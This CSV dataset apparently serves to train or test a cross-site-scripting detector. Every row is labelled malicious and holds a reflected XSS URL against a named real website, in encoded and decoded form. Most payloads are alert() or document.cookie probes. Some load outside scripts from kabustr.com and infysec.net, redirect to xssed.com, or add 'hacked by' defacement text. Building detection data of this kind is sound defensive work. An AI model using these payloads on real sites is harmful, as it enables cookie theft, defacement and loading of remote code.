Payloads,Class,decoded,executed,parser_changed
http://www.occidental-hoteles.com/occidental/web/language.jsp?language=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/sc<br>ript&gt;,Malicious,"http://www.occidental-hoteles.com/occidental/web/language.jsp?language=""><script>alert(""maxwel"")</script>",True,True
http://www.googleearth4mac.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%6c%65<br>%72%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%58%53%<br>53%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3e&amp;c=1&amp;p=1&amp;r=118688059<br>4051,Malicious,"http://www.googleearth4mac.tk/a?t='""></title><script>alert(1337)</script>><marquee><h1>XSS by XYLITOL</h1></marquee>&c=1&p=1&r=1186880594051",True,True
http://rasthie.com/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%<br>74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%3<br>1%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31<br>%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious,"http://rasthie.com/tt/index.php?action=index&setdate=200703&setday=21"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
&page=1",True,True
http://www.centromodaonline.com/nfw/news.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.centromodaonline.com/nfw/news.php?id=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://buyersguide.cioinsight.com/bguide/company/listcompaniesbysite.asp?page=13&amp;cbopagesize=&amp;getlis<br>tby=%22%3e%3cscript%3ealert(%22xssed_by_omeha%22)%3c/script%3e%3cscript%3ealert(document.cookie)%3c/<br>script%3e,Malicious,"http://buyersguide.cioinsight.com/bguide/company/listcompaniesbysite.asp?page=13&cbopagesize=&getlistby=""><script>alert(""xssed_by_omeha"")</script><script>alert(document.cookie)</script>",True,True
http://www.gulftalent.com/home/canpositions-viewlist-s.php?currentpage=3&amp;recordsperpage=25&amp;name_flag<br>=&amp;from_search=true&amp;jobcat=&amp;industry=22&amp;seniority=&amp;frmpositioncountry=&amp;pastdate=&amp;from_possearch=&amp;pos_<br>ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.gulftalent.com/home/canpositions-viewlist-s.php?currentpage=3&recordsperpage=25&name_flag=&from_search=true&jobcat=&industry=22&seniority=&frmpositioncountry=&pastdate=&from_possearch=&pos_ref=""><script>alert(document.cookie);</script>",True,True
"http://www.bb.com.br/portalbb/page22,116,2045,1,1,1,1.bb?codigomenu=--%3e%3cscript%3ealert%28%27xsse<br>d%27%29%3c/script%3e%3ciframe%20src=http://www.xssed.com/%20height=1000%20width=1000%3e%3c/iframe%3e<br>%3c!--",Malicious,"http://www.bb.com.br/portalbb/page22,116,2045,1,1,1,1.bb?codigomenu=--><script>alert('xssed')</script><iframe src=http://www.xssed.com/ height=1000 width=1000></iframe><!--",True,True
http://www.myweddinggiftsregistry.co.za/search-wedding-gifts.php?search=wawa%22%3e%27%3e%3ciframe%20<br>src=javascript:alert(123)%3e&amp;submit=go,Malicious,"http://www.myweddinggiftsregistry.co.za/search-wedding-gifts.php?search=wawa"">'><iframe src=javascript:alert(123)>&submit=go",True,True
http://www.elite4host.com/support/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.co<br>m/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(docu<br>ment.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious,"http://www.elite4host.com/support/index.php?<script language=""javascript"" src=""http://kabustr.com/chat/c.js"" type=""text/javascript"">kabus-kabustr.com-kabus-kabustr.com</script><script>alert(document.cookie);</script><script>alert(/kabus/);</script>",True,True
http://www.english.education.gov.qa/content/general/search?keywords=%3c%2fscript%3e%3cscript%3ealert<br>%28%22noph0bia%22%29%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious,"http://www.english.education.gov.qa/content/general/search?keywords=</script><script>alert(""noph0bia"")</script>&x=0&y=0",True,True
http://www.tarbazonline.com/fgaleri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+n<br>arcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.tarbazonline.com/fgaleri/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://search.sweetim.com/search.asp?src=2&amp;q='&gt;&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;,Malicious,http://search.sweetim.com/search.asp?src=2&q='><script>alert(/the-sh0ck-b0y/)</script>,True,True
http://lauhakan.home.cern.ch/lauhakan/searchbooks.asp?q=%22%3e%3cscript%3ealert('seymen')%3c/script%<br>3e,Malicious,"http://lauhakan.home.cern.ch/lauhakan/searchbooks.asp?q=""><script>alert('seymen')</script>",True,True
http://gdr.leonardo.it/extremelot/personaggio/crea.asp?f=11&amp;m=1&amp;n=%3e%22%3e%3cscript%3ealert(%22xss%<br>22)%3c/script%3e,Malicious,"http://gdr.leonardo.it/extremelot/personaggio/crea.asp?f=11&m=1&n=>""><script>alert(""xss"")</script>",True,True
http://www.ea.com/official/godfather/godfather/us/scripts/sound_js.inc?page=&quot;&gt;&lt;script&gt;alert('arham<br>muhammad')&lt;/script&gt;,Malicious,"http://www.ea.com/official/godfather/godfather/us/scripts/sound_js.inc?page=""><script>alert('arhammuhammad')</script>",True,True
http://www.warezreleases.com/?to=search&amp;q=&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;/script&gt;,Malicious,"http://www.warezreleases.com/?to=search&q=""><script>alert(""fugitif"")</script>",True,True
http://www.verizonbusiness.com/us/about/expertise/news2.xml?newsid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;,Malicious,"http://www.verizonbusiness.com/us/about/expertise/news2.xml?newsid=""><script>alert(""maxwel"")</script>",True,True
http://info.ingres.com/g/?k83hptv4cr=clicksrc:ingres%22/%3e%3cscript%3ealert%28%27wooo%27%29;%3c/scr<br>ipt%3exxxx,Malicious,"http://info.ingres.com/g/?k83hptv4cr=clicksrc:ingres""/><script>alert('wooo');</script>xxxx",True,True
http://www.audi.ua/modell_start.php?k_id=%3e%22%3e%3cscript%20%0a%0d%3ealert(/xss%20by%20turkpower%2<br>0-%20from%20turkey/)%3b%3c/script%3e%3ch1%3exss%20by%20turkpower%20-%20from%20turkey%3c/h1%3e%3c/mar<br>quee%3e,Malicious,"http://www.audi.ua/modell_start.php?k_id=>""><script 
>alert(/xss by turkpower - from turkey/);</script><h1>xss by turkpower - from turkey</h1></marquee>",True,True
http://www.scitexvision.com/access.asp?url=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.scitexvision.com/access.asp?url=""><script>alert(""maxwel"")</script>",True,True
http://hopla.fr/detail.php?id=%22%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious,"http://hopla.fr/detail.php?id=""><script>alert(1)</script>",True,True
http://www.crazyaboutgadgets.com/search/?criteria=%22%3e%3ciframe+src%3djavascript%3aalert(123)%3e&amp;c<br>ategory=all,Malicious,"http://www.crazyaboutgadgets.com/search/?criteria=""><iframe src=javascript:alert(123)>&category=all",True,True
http://www.diyarbakirsanat.org/diyarbakir.asp?lid=%3e%3ctitle%3elost%20in%20love%20:)%3c/title%3e%3c<br>script%3edocument.write('cyber-emperor@hotmail.com')%3c/script%3e%3cmarquee%3e%3ch1%3hacked%20by%20c<br>yber%20|%20ferda%20forever%3c/h1%3e%3c/marquee%3e%3cimg%20src=%22http://img246.imageshack.us/img246/<br>9121/wattarmadt1.jpg%22%3e%3cscript%3ealert%20('cyber%20was%20here')%3c/script%3e%3c,Malicious,"http://www.diyarbakirsanat.org/diyarbakir.asp?lid=><title>lost in love :)</title><script>document.write('cyber-emperor@hotmail.com')</script><marquee><h1%3hacked by cyber | ferda forever</h1></marquee><img src=""http://img246.imageshack.us/img246/9121/wattarmadt1.jpg""><script>alert ('cyber was here')</script><",True,True
http://harmanim.co.il/index/search.php?search=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fsc<br>ript%3e%d7%97%d7%a4%d7%a9+%d7%95%d7%99%d7%93%d7%90%d7%95,Malicious,"http://harmanim.co.il/index/search.php?search='""></title><script>alert(1337)</script>חפש וידאו",True,True
http://www.ezopera.net/opera/bbs.cgi?mode=change&amp;no=6635'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%<br>20kusomiso.com%22)%3c/script%3e,Malicious,"http://www.ezopera.net/opera/bbs.cgi?mode=change&no=6635'>"">'><script>alert(""xss by kusomiso.com"")</script>",True,True
<script 5-0*3+9/3=>prompt(1)</script giveanswerhere=?,Malicious,<script 5-0*3 9/3=>prompt(1)</script giveanswerhere=?,True,True
http://www.aolfeedback-clarabridge.com/se.ashx?s=04bd76cc65a7bb3c&amp;tid=&quot;&gt;&lt;script&gt;document.location='h<br>ttp://xssed.com';&lt;/script&gt;&amp;r=&quot;&gt;&lt;script&gt;alert(&quot;xssed&quot;)&lt;/script&gt;&amp;success=yes&amp;ch=&amp;oid=&amp;c=en-us,Malicious,"http://www.aolfeedback-clarabridge.com/se.ashx?s=04bd76cc65a7bb3c&tid=""><script>document.location='http://xssed.com';</script>&r=""><script>alert(""xssed"")</script>&success=yes&ch=&oid=&c=en-us",True,True
http://www.dgess.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/<br>h1&gt;&lt;/marquee&gt;,Malicious,"http://www.dgess.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.deutscher-kolonialverein.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.deutscher-kolonialverein.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://insulincongress.org/search.cfm?searchtext=%3e%3cscript%3ealert(%22xssed%20by%20azat%22)%3c/sc<br>ript%3e,Malicious,"http://insulincongress.org/search.cfm?searchtext=><script>alert(""xssed by azat"")</script>",True,True
http://ww2.ikeepbookmarks.com/login.asp?folder=78&amp;url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://ww2.ikeepbookmarks.com/login.asp?folder=78&url=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://i-net.banka-koper.si/info/cgi/infobanka.exe?f=20&amp;section=depoziti&amp;site=&quot;&gt;&lt;script&gt;alert('xss')<br>&lt;/script&gt;,Malicious,"http://i-net.banka-koper.si/info/cgi/infobanka.exe?f=20§ion=depoziti&site=""><script>alert('xss')</script>",True,True
http://www.gastenboek.nl/aanmelden.php?gb_naam=%22%3e%3cscript%3ealert(%2fkiller-tr%2f)%3c%2fscript%<br>3e,Malicious,"http://www.gastenboek.nl/aanmelden.php?gb_naam=""><script>alert(/killer-tr/)</script>",True,True
http://www.kerb-altenbuch.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.kerb-altenbuch.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.qweb.es/cert-www.corporinoquia.gov.co.html%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.qweb.es/cert-www.corporinoquia.gov.co.html'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.adlbilisim.com/adl/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.adlbilisim.com/adl/default.asp?gb=urun&id=293&ortak=""><script>alert(""backdoor"")</script>",True,True
http://www.travelingpanties.com/member/profile_list.php?command=search_result&amp;search_type=&quot;&gt;&lt;script&gt;<br>alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.travelingpanties.com/member/profile_list.php?command=search_result&search_type=""><script>alert(""backdoor"")</script>",True,True
http://www.verbaco.com/verbacoportal/en/index.jsp?newlang=%22%3e%3cscript%3ealert(/xss/.source)%3c/s<br>cript%3e,Malicious,"http://www.verbaco.com/verbacoportal/en/index.jsp?newlang=""><script>alert(/xss/.source)</script>",True,True
http://washington.nationals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scri<br>pt&gt;,Malicious,http://washington.nationals.mlb.com/media/video.jsp?mid=<script>alert('pappy was here');</script>,True,True
http://www.clipart.com/en/search/split?sub1=&amp;orows=3&amp;ocols=9&amp;realign=&amp;a=a&amp;q=%3c/script%3e%3cscript%3<br>eeval(window.location.hash.substring(1))//&amp;k_mode=all&amp;k_exc=&amp;q_color=1&amp;q_bw=1&amp;q_gif=1&amp;q_jpeg=1&amp;q_eps<br>=1&amp;q_wmf=1&amp;q_psd=1&amp;q_png=1&amp;rows=3&amp;srch=search#alert(%27xss%20by%20bho%27);%20document.body.innerhtml<br>=%27xss%20by%20bho%27;,Malicious,http://www.clipart.com/en/search/split?sub1=&orows=3&ocols=9&realign=&a=a&q=</script><script>eval(window.location.hash.substring(1))//&k_mode=all&k_exc=&q_color=1&q_bw=1&q_gif=1&q_jpeg=1&q_eps=1&q_wmf=1&q_psd=1&q_png=1&rows=3&srch=search#alert('xss by bho'); document.body.innerhtml='xss by bho';,True,True
http://www.military.com/resources/historysubmittedfileview?file=%3cscript%3ealert(document.cookie)%3<br>c/script%3e,Malicious,http://www.military.com/resources/historysubmittedfileview?file=<script>alert(document.cookie)</script>,True,True
http://help.travian.se/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b<br>%3c%2fscript%3e,Malicious,"http://help.travian.se/index.php?type=faq&mod=""><script>alert(/xss by redtuning/);</script>",True,True
http://www.cafeboomerang.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.cafeboomerang.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.eeda.org.uk/search.asp?search=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/script&gt;,Malicious,"http://www.eeda.org.uk/search.asp?search=""><script>alert(""cyber"")</script>",True,True
http://www.worldwidepay.com/index.php?read=%22%3e/r0hit/%3e%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e%3cscript%20src=http://infysec.net/x.js%3e%3c/script%3e,Malicious,"http://www.worldwidepay.com/index.php?read="">/r0hit/><script>alert(document.cookie)</script><script src=http://infysec.net/x.js></script>",True,True
http://www.evrensel.net/mektup.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious,"http://www.evrensel.net/mektup.php?txt_arsiv_tarihi=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>.com",True,True
http://www.nmmzt.gov.cn/c.ss/subm.asp?id=%3cscript%3ealert(%22milisx%22)%3c/script%3e,Malicious,"http://www.nmmzt.gov.cn/c.ss/subm.asp?id=<script>alert(""milisx"")</script>",True,True
http://privatepaste.com/&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;a &quot;,Malicious,"http://privatepaste.com/""><script>alert(document.cookie)</script><a """,True,True
http://www.phys.virginia.edu/people/personal.asp?uid=dv3h%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious,"http://www.phys.virginia.edu/people/personal.asp?uid=dv3h""><script>alert(1)</script>",True,True
http://www.consultadni.mendoza.gov.ar/?dni=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(400558925539)%3b&lt;/script&gt;,Malicious,"http://www.consultadni.mendoza.gov.ar/?dni=>""><script 
>alert(400558925539);</script>",True,True
http://gallery.azlink.info/gallery/login.asp?folder=qarabag&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://gallery.azlink.info/gallery/login.asp?folder=qarabag&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://gow.epsrc.ac.uk/listgrants.aspx?mode=latest}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/xss/.source))<br>;&lt;/script&gt;,Malicious,http://gow.epsrc.ac.uk/listgrants.aspx?mode=latest}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://www.gatlinburg.com/attractions/search.asp?subcategory=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.gatlinburg.com/attractions/search.asp?subcategory=""><script>alert(""maxwel"")</script>",True,True
http://nod32smart.com/newrantileech/rsmsantileech/check.php?file=&quot;&gt;&lt;script&gt;alert(/pyske/)&lt;/script&gt;,Malicious,"http://nod32smart.com/newrantileech/rsmsantileech/check.php?file=""><script>alert(/pyske/)</script>",True,True
http://client4.addonchat.com/scwho.pl?id=430&amp;subroom=435&amp;boldadmin=0&amp;comma=1&amp;countonly=0&amp;chatbg=fff5<br>c2&amp;chatusr=3333ff&amp;subroomcolor=000000&amp;chatadmusr=3333ff&amp;nousermsg=%3cscript%3ealert(%22xssed%22)%3c/<br>script%3e,Malicious,"http://client4.addonchat.com/scwho.pl?id=430&subroom=435&boldadmin=0&comma=1&countonly=0&chatbg=fff5c2&chatusr=3333ff&subroomcolor=000000&chatadmusr=3333ff&nousermsg=<script>alert(""xssed"")</script>",True,True
https://www.claredi.com/public/certdetails.php?username=oxfordcert}%3c/style%3e%3cscript%3ea=eval%3b<br>b=alert%3ba(b(/xss/.source))%3b%3c/script%3e,Malicious,https://www.claredi.com/public/certdetails.php?username=oxfordcert}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://www.spaarparadijs.info/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.spaarparadijs.info/register.php?ref=""><script>alert(1);</script>",True,True
http://www.swi-finance.de/bankentest/index.php?q4_9=%22%3e%3cscript%3ealert(1);%3c/script%3e,Malicious,"http://www.swi-finance.de/bankentest/index.php?q4_9=""><script>alert(1);</script>",True,True
http://www.resumes2work.com/jobsearch.php?s=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.resumes2work.com/jobsearch.php?s=""><script>alert(""maxwel"")</script>",True,True
http://www.ittvis.com/codebank/search.asp?search=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.ittvis.com/codebank/search.asp?search=""><script>alert(""maxwel"")</script>",True,True
http://www.militaryfuneralhonors.osd.mil/hnrs/owa/director.show_results?v_svc=%22%3e%3cscript%3ealer<br>t(0)%3c/script%3e_states=01&amp;v_submit=enter,Malicious,"http://www.militaryfuneralhonors.osd.mil/hnrs/owa/director.show_results?v_svc=""><script>alert(0)</script>_states=01&v_submit=enter",True,True
http://www.seckinkoleji.com/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.seckinkoleji.com/folderview.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://45.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://45.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://recherche.fluctuat.net/?q=%3cscript%3ealert%28document.cookie%29;%3c/script%3e,Malicious,http://recherche.fluctuat.net/?q=<script>alert(document.cookie);</script>,True,True
http://search.chow.com/search?query=&amp;advanced=&amp;type=&amp;from_date=10+years+ago&amp;to_date=&quot;&gt;&lt;script&gt;alert(<br>'chow%20on%20these%20nuts!!!!!!!');&lt;/script&gt;&amp;sort_mode=&lt;/title&gt;test,Malicious,"http://search.chow.com/search?query=&advanced=&type=&from_date=10 years ago&to_date=""><script>alert('chow on these nuts!!!!!!!');</script>&sort_mode=</title>test",True,True
